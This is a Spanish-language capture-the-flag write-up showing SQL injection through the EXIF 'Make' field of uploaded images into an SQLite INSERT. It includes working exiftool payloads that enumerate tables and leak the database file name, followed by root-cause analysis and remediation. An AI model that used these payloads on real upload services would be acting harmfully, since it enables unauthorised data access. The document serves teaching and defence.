# Galería de imágenes — Writeup

## Descripción del desafío

Lucía desarrolla un sitio de galería de fotos. Por cada imagen subida se
muestra el **fabricante de la cámara** (y opcionalmente el software de
edición) leídos de los metadatos de la imagen. El backend usa un archivo
**SQLite** como base de datos, con un nombre "especial". El objetivo es
descubrir el nombre de ese archivo.

## Reconocimiento

La página permite subir una imagen (jpg/jpeg, máx. 1 MB) y muestra debajo el
campo **"Fabricante"**. Una imagen de ejemplo mostraba
`Fabricante: NIKON CORPORATION` — un valor típico del campo EXIF `Make`.

Esto sugiere que la aplicación **lee el metadato EXIF `Make` de la imagen
subida** y lo vuelca directo en la página (y, se sospecha, en una consulta
SQL de inserción).

## Preparación del entorno

Se usó `exiftool` (WSL/Ubuntu) para modificar el campo `Make` de una imagen
antes de subirla:

```bash
sudo apt install -y exiftool imagemagick
```

La imagen de prueba excedía el límite de 1 MB impuesto por el servidor
(`413 Request Entity Too Large` de nginx), así que se redujo con
ImageMagick, comprobando que el metadato sobrevive a la recompresión:

```bash
convert foto.jpg -resize 800x800 -quality 70 foto_chica.jpg
exiftool -Make foto_chica.jpg    # el campo Make se conserva
```

## Análisis — confirmando la inyección

**Paso 1 — control positivo.** Se cambió `Make` a un valor simple:
```bash
exiftool -overwrite_original -Make="PRUEBA123" foto_chica.jpg
```
La galería mostró `Fabricante: PRUEBA123`, confirmando que el valor se
vuelca sin modificar.

**Paso 2 — comilla simple.** Se probó `Make="test'"`. La página devolvió:
```
unrecognized token: "'test'')"
```
Un error típico de **SQLite** causado por concatenación directa del input
en una sentencia SQL, probablemente un `INSERT INTO ... VALUES (..., 'MAKE')`
(el paréntesis de cierre visible en el error coincide con el final de un
`VALUES(...)`).

**Paso 3 — doble comilla.** Se probó `Make="test''"`. La galería mostró
`Fabricante: test'` (una sola comilla). Esto confirma el patrón de SQLi: en
SQL, `''` dentro de un literal representa una comilla escapada; como el
valor se concatena crudo sin sanitizar, se comportó exactamente como lo
haría dentro de una sentencia SQL real.

## Explotación

El objetivo era **leer datos**, no romper la sintaxis. Se usó el operador de
concatenación de SQLite (`||`) para inyectar una subconsulta dentro del
mismo string, sin necesidad de cerrar comillas de forma destructiva:

```
' || (SELECT ...) || '
```

### Paso 1 — listar tablas

```bash
exiftool -overwrite_original -Make="' || (SELECT group_concat(name) FROM sqlite_master) || '" foto_chica.jpg
```

Resultado en el campo Fabricante:
```
images,sqlite_sequence
```

Confirma la estructura de la base: tabla `images` (fotos y metadatos) y la
tabla interna `sqlite_sequence` (autogenerada por SQLite para columnas
`AUTOINCREMENT`).

### Paso 2 — obtener el nombre del archivo de base de datos

SQLite expone esta información mediante la tabla virtual
`pragma_database_list()`, utilizable dentro de un `SELECT` (a diferencia del
comando `PRAGMA` normal, que no puede invocarse desde una subconsulta
inyectada):

```bash
exiftool -overwrite_original -Make="' || (SELECT file FROM pragma_database_list()) || '" foto_chica.jpg
```

### Resultado

```
Fabricante: /app/DESAFIO-SUPERADO-3f8ca106a5118b3c418ec00907120d6a.db
```

**Nombre del archivo / Flag:**
`DESAFIO-SUPERADO-3f8ca106a5118b3c418ec00907120d6a.db`

## Causa raíz y remediación

- **Causa raíz:** el valor leído de metadatos EXIF de un archivo subido por
  el usuario (dato no confiable, totalmente controlable por un atacante) se
  concatena directamente en una sentencia SQL `INSERT`, sin sanitización ni
  parametrización. Es SQL Injection (CWE-89) con un vector de entrada poco
  habitual: no un campo de formulario, sino metadatos de un archivo.

- **Remediación recomendada:**
  1. Usar **sentencias preparadas / parametrizadas** para cualquier dato que
     provenga del exterior, **incluyendo metadatos de archivos subidos**
     (EXIF, ID3, propiedades de documentos, etc.), que son tan no confiables
     como cualquier input de un formulario:
     ```python
     cursor.execute(
         "INSERT INTO images (fabricante, ...) VALUES (?, ...)",
         (make_exif, ...)
     )
     ```
  2. Validar/sanear los metadatos leídos antes de almacenarlos o mostrarlos
     (longitud máxima, caracteres permitidos), tanto para prevenir SQLi como
     XSS si el valor se renderiza en HTML sin escapar.
  3. Desactivar mensajes de error verbosos del motor de base de datos en
     producción; el error de sintaxis de SQLite devuelto al cliente facilitó
     enormemente reconstruir la estructura de la query.
  4. Restringir el acceso del usuario de base de datos de la aplicación
     (principio de mínimo privilegio) para limitar el impacto de una
     inyección exitosa, aunque la mitigación principal sigue siendo la
     parametrización.

## Herramientas usadas

- `exiftool` (edición de metadatos EXIF, en particular el campo `Make`)
- ImageMagick (`convert`, para reducir el tamaño de la imagen conservando
  los metadatos EXIF)
- WSL2 / Ubuntu como entorno de trabajo